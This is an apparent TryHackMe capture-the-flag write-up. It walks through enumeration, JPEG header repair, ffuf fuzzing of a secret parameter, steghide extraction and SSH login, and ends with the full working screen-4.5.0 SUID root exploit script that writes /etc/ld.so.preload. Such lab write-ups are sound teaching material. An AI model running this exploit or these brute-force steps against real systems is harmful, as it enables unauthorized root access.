## Target IP: `10.10.78.255`

---

### Environment Setup

```bash
export IP=10.10.78.255
export LIP=10.6.24.56
```

---

### Nmap & Nikto Scans

```bash
sudo nmap -sC -sV -T4 -O $IP -oN nmap_scan.txt
nikto -h http://$IP
```

**Open Ports:**

| Port | Service | Version |
| --- | --- | --- |
| 22 | SSH | OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 |
| 80 | HTTP | Apache httpd 2.4.18 |

---

### Web Enumeration

```bash
gobuster dir -u http://$IP -w /usr/share/wordlists/dirb/common.txt -x php
```

- Gobuster returned nothing.
- Apache default page.
- Source code:

```html
<img src="thm.jpg" class="floating_element"/>
<!-- They will never find me-->
```

Downloaded `thm.jpg`, tried to open it — broken. Inspected:

```bash
head thm.jpg
```

- Showed it was actually a PNG, not a JPG.

Fixed using `hexedit`:

```bash
hexedit thm.jpg
```

Changed header to:

```
FF D8 FF E0 00 10 4A 46 49 46 00 01
```

Now it opens. Image reveals:

```
hidden directory /th1s_1s_h1dd3n
```

---

### Hidden Directory Content

Visited `http://10.10.78.255/th1s_1s_h1dd3n`

- Page says:

```
Welcome! I have been expecting you!
To obtain my identity you need to guess my secret!
```

- Source code hint:

```html
<!-- It's between 0-99 but I don't think anyone will look here-->
```

Tried:

```bash
curl -i 'http://10.10.78.255/th1s_1s_h1dd3n/?secret=1'
```

Response size: 407

Tried a 2-digit number:

```bash
curl -i 'http://10.10.78.255/th1s_1s_h1dd3n/?secret=10'
```

Response size: 408

So we filtered for those two:

Made number list (because Kali doesn’t have one):

```python
number = 0
while number < 100:
    number += 1
    print(number)
```

Saved as `numbers.txt`

Brute-forced with:

```bash
ffuf -u http://10.10.78.255/th1s_1s_h1dd3n/?secret=FUZZ -w numbers.txt -fs 407,408
```

**Hit on 73**:

```
Urgh, you got it right! But I won't tell you who I am! [REDACTED]
```

---

### Stego (thm.jpg)

Used password from above to extract hidden file:

```bash
steghide extract -sf thm.jpg
```

Passphrase: `[REDACTED]`

Extracted `hidden.txt`:

```
Fine you found the password!
Here's a username
wbxre
I didn't say I would make it easy for you!
```

**ROT13 of `wbxre` → `joker`**

---

### Second Stego (Box Image)

Needed to use the TryHackMe box image... Not cool but part of the challenge.

- Extracted with `steghide`
- Found `password.txt`

Contents:

```
I didn't think you'd find me! Congratulations!
Here take my password
[REDACTED]
```

---

### SSH Access

```bash
ssh joker@10.10.78.255
```

**Username:** `joker`

**Password:** `*[REDACTED]`

Logged in successfully. Grabbed `user.txt`.

---

### Privilege Escalation (SUID Binary Abuse)

Checked for SUID binaries:

```bash
find /bin -perm -4000
```

**Found: `/bin/screen-4.5.0`**

---

### Explain This:

```bash
find /bin -perm -4000
```

That `-perm -4000` flag means "find all files that have the SUID bit set." SUID = Set User ID. If a binary has that bit, it runs with the **permissions of the file owner**, not the user executing it. If it's owned by root (most are), then it's a potential privilege escalation vector. You’re basically looking for binaries that let regular users execute things with root privileges.

---

### Exploiting screen 4.5.0 (Local Root Exploit)

Downloaded exploit from Google. Used this script:

```bash
#!/bin/bash
echo "~ gnu/screenroot ~"
echo "[+] First, we create our shell and library..."

cat << EOF > /tmp/libhax.c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!\n");
}
EOF

gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
rm -f /tmp/libhax.c

cat << EOF > /tmp/rootshell.c
#include <stdio.h>
int main(void){
    setuid(0); setgid(0); seteuid(0); setegid(0);
    execvp("/bin/sh", NULL, NULL);
}
EOF

gcc -o /tmp/rootshell /tmp/rootshell.c
rm -f /tmp/rootshell.c

echo "[+] Now we create our /etc/ld.so.preload file..."
cd /etc
umask 000
screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so"

echo "[+] Triggering..."
screen -ls

/tmp/rootshell
```

Saved as `screenroot.sh` and ran it.

```bash
chmod +x screenroot.sh
./screenroot.sh
```

Spawned **root shell**.

---

### Root Access

```bash
whoami
```

- `root`

Grabbed final flag:

```bash
cat /root/root.txt
```

Output:

```
THM{[REDACTED]}
```
